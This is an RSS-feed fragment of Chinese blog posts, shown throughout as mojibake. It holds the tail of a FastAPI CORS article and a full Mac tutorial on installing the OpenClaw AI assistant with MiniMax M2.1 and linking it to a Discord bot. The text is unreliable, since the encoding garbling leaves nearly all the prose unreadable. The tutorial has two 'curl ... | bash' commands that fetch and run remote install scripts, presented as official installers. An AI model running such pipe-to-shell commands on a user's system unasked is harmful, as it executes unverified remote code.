<p>å¥½äºï¼å³äºFastAPIçCORSï¼æçç»éªå·®ä¸å¤é½ååºæ¥äºãå«åå ä¸ºä¸ä¸ªééç¬¦éç½®å¼åå®å¨äºä»¶ï¼å¸æè¿ç¯è½å¸®ä½ çä¸å ä¸ªç¬å¤debugçæä¸ã</p>
<p>å¦æä½ å¨é¨ç½²æ¶è¿éå°è¿å¶ä»å¥æªçâæ¦è·¯èâï¼æèææ´ä¼éçéç½®æ¹æ¡ï¼<strong>ä¸å®å¨ä¸é¢åäº«åºæ¥å</strong>ï¼ææ¯äººçæé¿ï¼ä¸å°±æ¯é è¿æ ·ä¸æ¬¡æ¬¡âè¸©åâåâå¡«åâçæ¥ååãæ¶èè¿ç¯æç« ï¼ä¸æ¬¡é¨ç½²åç¿»åºæ¥å¯¹ç§ä¸ä¸ï¼å¤§æ¦çè½å¸®ä½ å¹³ç¨³è½å°ã</p>
<p>â ä½ çææ¯èæåï¼ä¸åç¨åºåª</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 08:50">2026-02-03 08:49</span>&nbsp;
<a href="https://www.cnblogs.com/ymtianyu">ä¸åç¨åºåªå</a>&nbsp;
éè¯»(<span id="post_view_count">47</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19567261);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19567261', targetLink: 'https://www.cnblogs.com/ymtianyu/p/19567261', title: 'FastAPIé¨ç½²å®æï¼èèCORSè·¨åé£äºå' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ Macä¸äº«ï¼åé¥­çº§æç¨ï¼æææå¸¦ä½ ç¨MiniMax 2.1ä¸Discordé¨ç½²ä¸ªäººAIå©æOpenClaw ]]></title>
    <link>https://www.cnblogs.com/weipo0105/p/19567203</link>
    <guid>781b5da29c0628d3dedaa0ed723e7947</guid>
    <description>
    <![CDATA[ 
		<h1 class="postTitle">
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/weipo0105/p/19567203" title="åå¸äº 2026-02-03 08:30">
    <span role="heading" aria-level="2">Macä¸äº«ï¼åé¥­çº§æç¨ï¼æææå¸¦ä½ ç¨MiniMax 2.1ä¸Discordé¨ç½²ä¸ªäººAIå©æOpenClaw</span>
    

</a>

		</h1>
		<div class="clear"></div>
		<div class="postBody">
			    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082925520-94146276.png" alt="Macä¸äº«ï¼åé¥­çº§æç¨ï¼æææå¸¦ä½ ç¨MiniMax 2.1ä¸Discordé¨ç½²ä¸ªäººAIå©æOpenClaw" class="desc_img">
        è¿ç¯æç¨è¯¦ç»è®²è§£å¦ä½å¨Macä¸é¨ç½²å¼æºAIå©æOpenClawãæä»¬å°ä½¿ç¨MiniMax 2.1ä½ä¸ºAIå¤§èï¼å¹¶ä»¥Discordä½ä¸ºäº¤äºå¹³å°ï¼æææå¸¦ä½ å®æä»ç¯å¢åå¤ãå®è£éç½®å°æç»æéçå®æ´æµç¨ãè·éæ­¥éª¤ï¼ä½ å°±è½å¨Discordä¸­ææ¥ä¸å±AIå©æå¤çä»»å¡ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>ä¸ä¸ç¯æç« ä¸­ï¼æä¸ºå¤§å®¶è¯¦ç»ä»ç»äºå¦ä½å¨ Windows ä¸é¨ç½² <strong>OpenClaw</strong> å¹¶æ¥å¥é£ä¹¦ï¼<a href="https://mp.weixin.qq.com/s/JGd4u8g-Fti4sRcJcSiOLQ" target="_blank" rel="noopener nofollow">ãä¿å§çº§æç¨ãææææä½ å®è£ OpenClaw å¹¶æ¥å¥é£ä¹¦ï¼è®© AI å¨èå¤©è½¯ä»¶éå¸®ä½ å¹²æ´»</a>ã</p>
<p>ä¸å°æåè¯¢é®æ¯å¦æ Mac ççé¨ç½²æç¨ãä»å¤©ï¼æç¨å°±æ¥å¦ï¼å¶å®å¨ Mac ä¸é¨ç½² OpenClaw ä¸ Windows æ­¥éª¤åºæ¬ä¸è´ã</p>
<p>æ¬æ¬¡æç¨é¤äºä»é¶å®æ OpenClaw çé¨ç½²å¤ï¼æå¤§çä¸åå¨äºäº¤äºå¹³å°æ¢æäº <strong>Discord</strong>ãæ¥ä¸æ¥ï¼å°±è·çæä¸æ­¥æ­¥å®æé¨ç½²å§ï¼</p>
<h1 id="ä¸ä»ä¹æ¯-openclaw">ä¸ãä»ä¹æ¯ OpenClaw</h1>
<p><strong>OpenClaw</strong>ï¼åå ClawdBotï¼æ¯ä¸ä¸ªå¼æºçä¸ªäºº AI å©æå¹³å°ï¼è¿è¡å¨ä½ èªå·±çè®¾å¤ä¸ãå®æ¯æéè¿ WhatsAppãTelegramãSlackãDiscordãé£ä¹¦ãééãQQãä¼ä¸å¾®ä¿¡ç­å¤ä¸ªå¹³å°ä¸ä½ äºå¨ã</p>
<p>å¶ç¹ç¹åæ¬ï¼</p>
<ul>
<li><strong>æ¬å°ä¼å</strong>ï¼è¿è¡å¨æ¬å°è®¾å¤ï¼æ°æ®å®å¨ç±èªå·±ææ§</li>
<li><strong>å¤å¹³å°æ¯æ</strong>ï¼æ¯æ macOSãLinuxãWindowsï¼WSL2ï¼</li>
<li><strong>å¤ééè¿æ¥</strong>ï¼å¯æ¥å¥ WhatsAppãTelegramãSlackãDiscordãGoogle ChatãSignalãiMessage ç­</li>
<li><strong>24/7 å¨çº¿</strong>ï¼ä»¥åå°æå¡å½¢å¼æç»­è¿è¡</li>
<li><strong>é«åº¦å¯å®å¶</strong>ï¼æ¯ææè½æ©å±ä¸èªå®ä¹éç½®</li>
</ul>
<hr>
<h1 id="äºåºæ¬è¦æ±">äºãåºæ¬è¦æ±</h1>
<ul>
<li><strong>Node.js</strong>ï¼çæ¬ â¥ 22.0.0ï¼å¿éï¼</li>
<li><strong>npm</strong>ï¼çæ¬ â¥ 9.0.0ï¼é Node.js å®è£ï¼</li>
<li><strong>ä¸ä¸ª AI æ¨¡åç API Key</strong>ï¼æ¬æç¨ä½¿ç¨ MiniMax M2.1ï¼</li>
</ul>
<hr>
<h1 id="ä¸å®è£ååå¤">ä¸ãå®è£ååå¤</h1>
<h2 id="ç¬¬ä¸æ­¥æ£æ¥-nodejs-çæ¬">ç¬¬ä¸æ­¥ï¼æ£æ¥ Node.js çæ¬</h2>
<p>æå¼ <strong>ç»ç«¯ï¼Terminalï¼</strong>ï¼æ <code>Cmd + Space</code> è¾å¥ âTerminalâ å¹¶åè½¦ã</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082841125-1465728362.png" class="lazyload"></p>
<p>æ§è¡ä»¥ä¸å½ä»¤æ£æ¥ Node.js çæ¬ï¼</p>
<pre><code class="language-bash">node --version
</code></pre>
<p><strong>é¢æè¾åº</strong>ï¼æ¾ç¤ºçæ¬å·ï¼åªè¦é«äº v22.x.x å³å¯ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840342-1086525948.png" class="lazyload"></p>
<p>å¦ææªå®è£ Node.js æçæ¬è¿ä½ï¼è¯·ç»§ç»­ä¸ä¸æ­¥ã</p>
<h2 id="ç¬¬äºæ­¥å®è£-nodejså¦é">ç¬¬äºæ­¥ï¼å®è£ Node.jsï¼å¦éï¼</h2>
<h3 id="æ¹æ³ä¸ä½¿ç¨å®æ¹å®è£åæ¨èæ°æ">æ¹æ³ä¸ï¼ä½¿ç¨å®æ¹å®è£åï¼æ¨èæ°æï¼</h3>
<ol>
<li>è®¿é® Node.js å®ç½ï¼<a href="https://nodejs.org/zh-cn/download" target="_blank" rel="noopener nofollow">https://nodejs.org/zh-cn/download</a></li>
<li>ä¸è½½ LTS çæ¬ï¼æ¨è 22.x ææ´é«ï¼</li>
<li>åå»ä¸è½½ç <code>.pkg</code> æä»¶ï¼ææç¤ºå®æå®è£</li>
<li>å®è£åéå¯ç»ç«¯ï¼æ§è¡ <code>node --version</code> éªè¯</li>
</ol>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082841060-478572803.png" class="lazyload"></p>
<h3 id="æ¹æ³äºä½¿ç¨-homebrewæ¨èå¼åè">æ¹æ³äºï¼ä½¿ç¨ Homebrewï¼æ¨èå¼åèï¼</h3>
<pre><code class="language-bash"># å®è£ Homebrewï¼å¦æªå®è£ï¼
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# ä½¿ç¨ Homebrew å®è£ Node.js
brew install node

# éªè¯å®è£
node --version
npm --version
</code></pre>
<h2 id="ç¬¬ä¸æ­¥åå¤-ai-æ¨¡å-api-key">ç¬¬ä¸æ­¥ï¼åå¤ AI æ¨¡å API Key</h2>
<p>OpenClaw éè¦è¿æ¥ AI æ¨¡åæè½å·¥ä½ãå½åæ¨èä½¿ç¨ <strong>MiniMax M2.1</strong>ã</p>
<h4 id="è·å-minimax-api-key">è·å MiniMax API Keyï¼</h4>
<p>1ãæ³¨åæç»å½è´¦å·</p>
<p>è®¿é®å®ç½ï¼<a href="https://platform.minimaxi.com/subscribe/coding-plan?code=FSXNO2PNQ1&amp;source=link" target="_blank" rel="noopener nofollow">https://platform.minimaxi.com/subscribe/coding-plan?code=FSXNO2PNQ1&amp;source=link</a></p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840344-1379120112.png" class="lazyload"></p>
<p>2ãéæ©éåçè®¢éå¥é¤</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840905-1364078359.png" class="lazyload"></p>
<p>3ãè·åAPI Key</p>
<p>è¿å¥ <strong>Coding plan</strong> é¡µé¢ï¼æ¾å° API Keyï¼ç¹å»éç½®å¹¶å¤å¶ãå¦¥åä¿å­å¤å¶ç API Key<br>
ç´è¾¾å°åï¼<a href="https://platform.minimaxi.com/user-center/payment/coding-plan" target="_blank" rel="noopener nofollow">https://platform.minimaxi.com/user-center/payment/coding-plan</a></p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840345-200786134.png" class="lazyload"></p>
<h1 id="åå®è£-openclaw">åãå®è£ OpenClaw</h1>
<h2 id="ä¸èªå¨èæ¬å®è£æ¨è">ä¸ï¼èªå¨èæ¬å®è£ï¼æ¨èï¼</h2>
<p>è¿æ¯æç®åãææ åçå®è£æ¹å¼ã</p>
<pre><code class="language-bash"># ä½¿ç¨å®æ¹èæ¬å®è£ OpenClaw
curl -fsSL https://openclaw.ai/install.sh | bash
</code></pre>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840340-1925562444.png" class="lazyload"></p>
<hr>
<h2 id="äºåå§åéç½®">äºï¼åå§åéç½®</h2>
<p>è¿è¡èªå¨èæ¬å®è£å®æåï¼ä¼èªå¨è¿å¥éç½®åå¯¼ï¼å¼å¯¼ä½ å®æä»¥ä¸è®¾ç½®ï¼</p>
<h4 id="1-é£é©åç¥">1. é£é©åç¥</h4>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840981-874470767.png" class="lazyload"></p>
<h4 id="2-å¼å¯¼é¢æ¿æ¨¡å¼éæ©å¿«éå¼å§">2. å¼å¯¼é¢æ¿æ¨¡å¼ï¼éæ©âå¿«éå¼å§â</h4>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840946-324728851.png" class="lazyload"></p>
<h4 id="3-è®¾ç½®-ai-æ¨¡å">3. è®¾ç½® AI æ¨¡å</h4>
<p>éæ© AI æä¾åï¼è¿éæä»¬éæ© <strong>MiniMax</strong>ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840349-906047764.png" class="lazyload"></p>
<p>éæ©æ¨¡åï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840997-307297480.png" class="lazyload"></p>
<p>è¾å¥ API Keyï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082841011-741305391.png" class="lazyload"></p>
<p>éæ©é»è®¤æ¨¡åï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840487-611756836.png" class="lazyload"></p>
<h4 id="4-éç½®ä¸-openclaw-éä¿¡çæ¸ é">4. éç½®ä¸ OpenClaw éä¿¡çæ¸ é</h4>
<p>è¿éæä»¬<strong>åéæ©è·³è¿</strong>ãæ¬æç¨åç»­å°ä½¿ç¨ <strong>Discord</strong> ä¸ OpenClaw éä¿¡ãç±äº Discord éç½®ç¨æ¾ç¹çï¼åé¢ä¼åç¬ç¨ä¸èè¯¦ç»è®²è§£å¦ä½æ¥å¥ Discord æºå¨äººãä½ éè¦æåä¸è½½å¹¶æ³¨åå¥½ Discordãå¦æè§å¾å°é¾ï¼ä¹å¯éæ©é£ä¹¦ï¼è¯¦ç»éç½®å¯åèæä¸ä¸ç¯æç« ï¼<a href="https://mp.weixin.qq.com/s/JGd4u8g-Fti4sRcJcSiOLQ" target="_blank" rel="noopener nofollow">https://mp.weixin.qq.com/s/JGd4u8g-Fti4sRcJcSiOLQ</a>ã</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840365-1461514995.png" class="lazyload"></p>
<h4 id="5-éç½®-skills">5. éç½® Skills</h4>
<p>Skills ä¹åè·³è¿ï¼åç»­å¯éè¿ Web UI çé¢éç½®ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840353-1702622945.png" class="lazyload"></p>
<h4 id="6-éç½®-hooks">6. éç½® Hooks</h4>
<p>Hooks æä»¬æä¸éè¦éç½®ãä½¿ç¨ä¸ä¸ç®­å¤´éæ© <strong>Skip for now</strong>ï¼æä¸ <strong>ç©ºæ ¼é®</strong> éä¸­ï¼ç¶ååè½¦ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840365-225378500.png" class="lazyload"></p>
<p>æ­¤æ¶å¼å§èªå¨å®è£ <strong>Gateway</strong> æå¡ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840356-720301825.png" class="lazyload"></p>
<p>ç¨ç­çå»ï¼Gateway æå¡å®è£å®æï¼å¼å§éæ©å¯å¨æºå¨äººçæ¹å¼ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840313-930500998.png" class="lazyload"></p>
<p>å®æåï¼OpenClaw ä¼èªå¨éè¿é»è®¤æµè§å¨æå¼ Web UI é¡µé¢ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840439-553412252.png" class="lazyload"></p>
<h1 id="äºéç½®-discord-å³æ¶éä¿¡å¹³å°">äºãéç½® Discord å³æ¶éä¿¡å¹³å°</h1>
<p>OpenClaw æ¯æå¤ç§éè®¯å¹³å°ï¼æ¬æç¨æä»¬éæ© <strong>Discord</strong>ã</p>
<h2 id="ä¸æ³¨åè´¦å·å¹¶ç»å½">ä¸ï¼æ³¨åè´¦å·å¹¶ç»å½</h2>
<blockquote>
<p>æ³¨æï¼ä½ éè¦èªè¡è§£å³ä¸ç½é®é¢ã</p>
</blockquote>
<p>å®æ¹å°åï¼<a href="https://discord.com" target="_blank" rel="noopener nofollow">https://discord.com</a></p>
<h2 id="äºåå»ºä¸ä¸ªæå¡å¨">äºï¼åå»ºä¸ä¸ªæå¡å¨</h2>
<h3 id="1-ç¹å»æ·»å æå¡å¨">1. ç¹å»âæ·»å æå¡å¨â</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840335-971343594.png" class="lazyload"></p>
<h3 id="2-éæ©äº²èªåå»º">2. éæ©âäº²èªåå»ºâ</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840355-994840257.png" class="lazyload"></p>
<h3 id="3-éæ©ä»ä¾æåæçæåä½¿ç¨">3. éæ©âä»ä¾æåæçæåä½¿ç¨â</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082841434-1086236172.png" class="lazyload"></p>
<h3 id="4-èªå®ä¹æå¡å¨åç§°">4. èªå®ä¹æå¡å¨åç§°</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840348-1267409946.png" class="lazyload"></p>
<h2 id="ä¸è¿å¥å¼åèåå°">ä¸ï¼è¿å¥å¼åèåå°</h2>
<p>è®¿é®å°åï¼<a href="https://discord.com/developers/applications" target="_blank" rel="noopener nofollow">https://discord.com/developers/applications</a></p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840665-61348343.png" class="lazyload"></p>
<h2 id="ååå»ºåºç¨">åï¼åå»ºåºç¨</h2>
<h3 id="1-ç¹å»åå»ºåºç¨">1. ç¹å»âåå»ºåºç¨â</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082841108-1468273130.png" class="lazyload"></p>
<h3 id="2-è¾å¥åºç¨åç§°">2. è¾å¥åºç¨åç§°</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840607-2112923851.png" class="lazyload"></p>
<h3 id="3-èªå¨è·³è½¬å°éç¨ä¿¡æ¯é¡µé¢">3. èªå¨è·³è½¬å°âéç¨ä¿¡æ¯âé¡µé¢</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840434-1858837212.png" class="lazyload"></p>
<h3 id="4-è·å-token">4. è·å Token</h3>
<p>ç¹å» <strong>Bot</strong> èåï¼ç¶åç¹å» <strong>éç½® Token</strong>ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840416-68205195.png" class="lazyload"></p>
<h3 id="5-éç½®å®æåå¤å¶ä½ ç-token">5. éç½®å®æåï¼å¤å¶ä½ ç Token</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840358-1799670849.png" class="lazyload"></p>
<h3 id="6-å¨å½åé¡µé¢ç»§ç»­åä¸æ»å¨æ¾å°-message-content-intent-å¹¶å¯ç¨">6. å¨å½åé¡µé¢ç»§ç»­åä¸æ»å¨ï¼æ¾å° <code>Message Content Intent</code> å¹¶å¯ç¨</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840481-2067435172.png" class="lazyload"></p>
<h3 id="7-è¿å¥-oauth2-éç½®é¡µé¢å¾é-bot">7. è¿å¥ <strong>OAuth2</strong> éç½®é¡µé¢ï¼å¾é <strong>Bot</strong></h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840402-920646921.png" class="lazyload"></p>
<h3 id="8-ç»§ç»­åä¸æ»å¨æ¾å°-bot-permissionså¾é-send-messages-å-read-message-history">8. ç»§ç»­åä¸æ»å¨ï¼æ¾å° <strong>Bot Permissions</strong>ï¼å¾é <strong>Send Messages</strong> å <strong>Read Message History</strong></h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840431-1197761914.png" class="lazyload"></p>
<h3 id="9-æ»å¨å°åºé¨å¤å¶çæç-bot-é¾æ¥">9. æ»å¨å°åºé¨ï¼å¤å¶çæç Bot é¾æ¥</h3>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840978-1921876634.png" class="lazyload"></p>
<h3 id="10-å°-bot-å å¥æå¡å¨">10. å° Bot å å¥æå¡å¨</h3>
<p>å¨æµè§å¨ä¸­æå¼åæå¤å¶çé¾æ¥ï¼éæ©ä¸ä¸ªæå¡å¨ï¼ç¸å½äºå°åå»ºçæºå¨äººå å¥è¯¥æå¡å¨ï¼ï¼éæ©åé¢åå»ºçèªå®ä¹æå¡å¨ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840461-964094122.png" class="lazyload"></p>
<p>ç¹å»âææâï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082841035-620410970.png" class="lazyload"></p>
<p>æææåï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840589-1269531197.png" class="lazyload"></p>
<p>ç°å¨ï¼ä½ å¯ä»¥å¨èªå·±åå»ºçæå¡å¨ä¸­ @ åææ·»å çæºå¨äººäºï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840626-1339366460.png" class="lazyload"></p>
<h2 id="äºå°-discord-æ¥å¥-openclaw">äºï¼å° Discord æ¥å¥ OpenClaw</h2>
<h3 id="1-è¿å¥-openclaw-éç½®">1. è¿å¥ OpenClaw éç½®</h3>
<p>æ§è¡ä»¥ä¸å½ä»¤ï¼</p>
<pre><code class="language-bash">openclaw config
</code></pre>
<p>è¿å¥è®¾ç½®ï¼éæ©âæ¬å°âï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840660-1502473952.png" class="lazyload"></p>
<p>éæ©âæ¸ éâï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840335-1846237037.png" class="lazyload"></p>
<p>éæ©âéç½®è¿æ¥âï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840608-948713147.png" class="lazyload"></p>
<p>éæ© <strong>Discord</strong>ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840558-2131425277.png" class="lazyload"></p>
<p>å¡«å¥åé¢è·åç Bot Tokenï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840341-1742983105.png" class="lazyload"></p>
<p>åè®¸ææé¢éï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840343-1139577657.png" class="lazyload"></p>
<p>éæ©âå®æâï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840309-1295364367.png" class="lazyload"></p>
<p>è®¿é®ç­ç¥ä¿æé»è®¤ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840358-711151966.png" class="lazyload"></p>
<p>éå¯¹æ¨¡å¼ä¹ä¿æé»è®¤ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840308-389354863.png" class="lazyload"></p>
<h3 id="2-å¯å¨ç½å³æå¡">2. å¯å¨ç½å³æå¡</h3>
<p>æ§è¡ä»¥ä¸å½ä»¤å¯å¨ç½å³æå¡ï¼</p>
<pre><code class="language-bash">openclaw gateway
</code></pre>
<p>å¦æä¹åå·²å¯å¨è¿ï¼è¯·åæ§è¡ <code>openclaw gateway stop</code> åæ­¢ï¼åæ§è¡ä»¥ä¸å½ä»¤ã</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840336-943479227.png" class="lazyload"></p>
<h3 id="3-å°-discord-ä¸-openclaw-éå¯¹">3. å° Discord ä¸ OpenClaw éå¯¹</h3>
<p>åå° Discord åå»ºçé¢éï¼ç¹å»å³ä¸è§çâæ¾ç¤ºæåâï¼å¯ä»¥çå°å½åé¢éæåãç¹å»æä»¬æ·»å ç Botï¼OpenClawã</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840546-290158971.png" class="lazyload"></p>
<p>ä½ ä¼çå°ä¸ä¸ªç§èè¾å¥æ¡ï¼å¯ä»¥è¯çåéä¸å¥è¯ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840308-1343684272.png" class="lazyload"></p>
<p>æ­¤æ¶ä¼è·³è½¬å°ç§ä¿¡èå¤©çé¢ï¼å¹¶æ¾ç¤ºä¸ä¸ª<strong>éå¯¹ç </strong>ãå¤å¶è¿ä¸ªéå¯¹ç ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840579-1971058821.png" class="lazyload"></p>
<p>æå¼ä¸ä¸ªæ°çç»ç«¯çªå£ï¼è¾å¥ä»¥ä¸å½ä»¤ï¼</p>
<pre><code class="language-bash">openclaw pairing approve discord &lt;Pairing code&gt;
</code></pre>
<p>å° <code>&lt;Pairing code&gt;</code> æ¿æ¢ä¸ºåæå¤å¶çéå¯¹ç ã<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840268-1864517004.png" class="lazyload"></p>
<h3 id="4-éå¯ç½å³æå¡">4. éå¯ç½å³æå¡</h3>
<p>åå°å¯å¨ç½å³çå½ä»¤è¡çªå£ï¼æä¸ <code>Ctrl + C</code> åæ­¢æå¡ï¼ç¶åéæ°å¯å¨ï¼</p>
<pre><code class="language-bash">openclaw gateway
</code></pre>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840314-211190531.png" class="lazyload"></p>
<p>è¯·æ³¨æï¼è¿ä¸ªå½ä»¤è¡çªå£ä¸è½å³é­ï¼å¦åæå¡ä¼åæ­¢ãå¦æå¸æåå°éé»è¿è¡ï¼å³ä½¿å³é­çªå£ä¹ä¸åå½±åï¼ï¼å¯ä»¥æ§è¡ï¼</p>
<pre><code class="language-bash">nohup openclaw gateway --port 18789 --verbose &gt; /dev/null 2&gt;&amp;1 &amp;
</code></pre>
<h3 id="5-æµè¯">5. æµè¯</h3>
<p>ç°å¨åå° Discord çæå¡å¨é¢éï¼å¨é¢éä¸­ @ ä½ åå»ºçæºå¨äººï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840421-1289454010.png" class="lazyload"></p>
<p>æ¥çæ¡é¢ææ¡£çå®éåå®¹ï¼ç¤ºä¾ï¼ï¼<br>
<img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082840968-190117423.png" class="lazyload"></p>
<p>Discord æ¥æå¤å¹³å°å®¢æ·ç«¯ï¼ä½ ä¹å¯ä»¥å¨ææºä¸å®è£ Discordï¼éè¿ææºææ¥ OpenClaw å·¥ä½ã</p>
<p>è³æ­¤ï¼OpenClaw å·²æåä¸ Discord æéãç°å¨ä½ å¯ä»¥å¨ Discord ä¸­éè¿ä¸ Bot å¯¹è¯çæ¹å¼ï¼ææ¥ OpenClaw ææ§ä½ ççµèäºï¼</p>
<h1 id="å­å¸¸ç¨å½ä»¤">å­ãå¸¸ç¨å½ä»¤</h1>
<h3 id="gateway-ç®¡ç">Gateway ç®¡ç</h3>
<pre><code class="language-bash"># å¯å¨ Gateway
openclaw gateway

# å¯å¨å¹¶æ¾ç¤ºè¯¦ç»æ¥å¿
openclaw gateway --verbose

# æå®ç«¯å£å¯å¨
openclaw gateway --port 18789
</code></pre>
<h3 id="éç½®ç®¡ç">éç½®ç®¡ç</h3>
<pre><code class="language-bash"># è¿è¡éç½®åå¯¼
openclaw onboard

# ç³»ç»å¥åº·æ£æ¥
openclaw doctor

# æ¥çéç½®
cat ~/.openclaw/openclaw.json
</code></pre>
<h3 id="æ´æ°ç®¡ç">æ´æ°ç®¡ç</h3>
<pre><code class="language-bash"># æ´æ°å°ææ°çæ¬
openclaw update

# åæ¢å°ç¹å®é¢é
openclaw update --channel stable    # ç¨³å®ç
openclaw update --channel beta      # æµè¯ç
openclaw update --channel dev       # å¼åç
</code></pre>
<h1 id="ç»è¯­">ç»è¯­</h1>
<p>è¦æ³è®© OpenClaw åºè²å°å¸®æä»¬å®æåç§ä»»å¡ï¼è¿éè¦ä¸ºå®å®è£åç§ Skillsã<strong>ç¹å»å¤´åå³æ³¨æ</strong>ï¼æ¥ä¸æ¥æä¼éæ­¥åäº« OpenClaw çæ´å¤è¿é¶ç©æ³ã</p>
<p>ä¹æ¬¢è¿éè¿ä¸»é¡µæ¾å°æï¼å å¥ <strong>OpenClaw å®æäº¤æµç¾¤</strong>ï¼ä¸æ´å¤åä½èä¸èµ·ç¢°æçµæãæ¢ç´¢æ°å¥ç©æ³ï¼</p>


</div>
<div class="clear"></div>

		</div>
		<div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-03 08:30">2026-02-03 08:30</span>&nbsp;
<a href="https://www.cnblogs.com/weipo0105">é¿å¡RPA</a>&nbsp;
